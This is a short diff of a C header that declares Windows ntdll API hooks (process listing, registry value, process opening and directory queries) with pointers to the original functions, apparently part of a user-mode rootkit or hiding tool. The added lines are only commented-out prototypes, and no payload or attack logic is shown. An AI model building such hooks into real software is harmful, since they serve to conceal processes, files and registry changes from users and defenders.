@@ -131,6 +131,10 @@ typedef NTSTATUS(WINAPI* pNtQueryDirectoryFile)(
     PUNICODE_STRING FileName,
     BOOLEAN RestartScan);
 
+// typedef NTSTATUS(WINAPI* pRtlDestroyProcessParameters)(
+//     PRTL_USER_PROCESS_PARAMETERS ProcessParameters
+// );
+
 // typedef NTSTATUS(WINAPI* pNtQueryInformationProcess)(
 //     HANDLE ProcessHandle,
 //     PROCESSINFOCLASS ProcessInformationClass,
@@ -158,6 +162,7 @@ NTSTATUS WINAPI HookedNtSetValueKey(HANDLE, PUNICODE_STRING, ULONG, ULONG, PVOID
 NTSTATUS WINAPI HookedNtDeleteValueKey(HANDLE, PUNICODE_STRING);
 NTSTATUS WINAPI HookedNtOpenProcess(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PCLIENT_ID);
 NTSTATUS WINAPI HookedNtQueryDirectoryFile(HANDLE, HANDLE, PIO_APC_ROUTINE, PVOID, PIO_STATUS_BLOCK, PVOID, ULONG, FILE_INFORMATION_CLASS, BOOLEAN, PUNICODE_STRING, BOOLEAN);
+// NTSTATUS WINAPI HookedRtlDestroyProcessParameters(PRTL_USER_PROCESS_PARAMETERS);
 // NTSTATUS WINAPI HookedNtQueryInformationProcess(HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG);
 
 extern pNtQuerySystemInformation OriginalNtQuerySystemInformation;
@@ -169,4 +174,5 @@ extern pNtSetValueKey OriginalNtSetValueKey;
 extern pNtDeleteValueKey OriginalNtDeleteValueKey;
 extern pNtOpenProcess OriginalNtOpenProcess;
 extern pNtQueryDirectoryFile OriginalNtQueryDirectoryFile;
+// extern pRtlDestroyProcessParameters OriginalRtlDestroyProcessParameters;
 // extern pNtQueryInformationProcess OriginalNtQueryInformationProcess;
